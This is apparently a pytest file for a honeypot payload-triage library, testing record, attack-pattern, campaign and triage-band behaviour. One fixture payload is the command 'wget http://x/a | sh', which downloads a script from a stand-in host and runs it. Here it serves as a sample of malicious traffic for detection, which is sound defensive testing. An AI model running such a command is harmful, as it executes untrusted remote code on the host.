"""Record and enum behaviour."""

from __future__ import annotations

from datetime import datetime, timedelta, timezone

from conftest import make_record

from deception_shield.models import AttackPattern, Campaign, PayloadRecord, TriageBand


class TestPayloadRecord:
    def test_length_reflects_the_payload(self) -> None:
        assert make_record(payload=b"abcdef").payload_length == 6

    def test_printable_ratio_for_text(self) -> None:
        assert make_record(payload=b"GET / HTTP/1.1").printable_ratio == 1.0

    def test_printable_ratio_for_binary(self) -> None:
        assert make_record(payload=bytes(range(0, 16))).printable_ratio < 0.3

    def test_printable_ratio_of_empty_payload(self) -> None:
        assert make_record(payload=b"").printable_ratio == 0.0

    def test_text_decoding_is_lenient(self) -> None:
        assert "�" in make_record(payload=b"\xff\xfe").payload_text()

    def test_text_is_truncated_to_the_limit(self) -> None:
        assert len(make_record(payload=b"A" * 9000).payload_text(limit=100)) == 100

    def test_document_shape_matches_the_pipeline(self) -> None:
        document = make_record(payload=b"wget http://x/a | sh").to_document()
        assert document["source"]["ip"] == "203.0.113.10"
        assert document["destination"]["port"] == 80
        assert document["threat"]["triage"] == "likely-malicious"
        assert isinstance(document["threat"]["payload_signatures"], list)

    def test_document_hex_is_bounded(self) -> None:
        """Capping the hex keeps a large payload from bloating the index."""
        document = make_record(payload=b"A" * 8000).to_document()
        assert len(document["payload_hex"]) == 2048 * 2


class TestAttackPattern:
    def _pattern(self, occurrences: int = 10, sources: int = 5, hours: float = 2.0) -> AttackPattern:
        start = datetime(2026, 9, 20, tzinfo=timezone.utc)
        return AttackPattern(
            name="x", technique="T1059", occurrences=occurrences, unique_sources=sources,
            first_seen=start, last_seen=start + timedelta(hours=hours),
        )

    def test_duration_in_hours(self) -> None:
        assert self._pattern(hours=3).duration_hours == 3.0

    def test_duration_is_never_negative(self) -> None:
        assert self._pattern(hours=-5).duration_hours == 0.0

    def test_sources_per_occurrence(self) -> None:
        assert self._pattern(occurrences=10, sources=10).sources_per_occurrence == 1.0
        assert self._pattern(occurrences=10, sources=1).sources_per_occurrence == 0.1

    def test_zero_occurrences_does_not_divide_by_zero(self) -> None:
        assert self._pattern(occurrences=0).sources_per_occurrence == 0.0


class TestCampaign:
    def test_size_counts_sources(self) -> None:
        now = datetime.now(timezone.utc)
        campaign = Campaign("c1", ["1.1.1.1", "2.2.2.2"], ["log4shell"], now, now)
        assert campaign.size == 2


class TestTriageBand:
    def test_compares_equal_to_its_string(self) -> None:
        assert TriageBand.CRITICAL == "critical"

    def test_rank_is_monotonic(self) -> None:
        ranks = [b.rank for b in (
            TriageBand.BENIGN, TriageBand.NOISE, TriageBand.SUSPICIOUS,
            TriageBand.LIKELY_MALICIOUS, TriageBand.CRITICAL,
        )]
        assert ranks == sorted(ranks)

    def test_comparison_with_a_foreign_type_is_not_implemented(self) -> None:
        assert TriageBand.BENIGN.__lt__(3) is NotImplemented
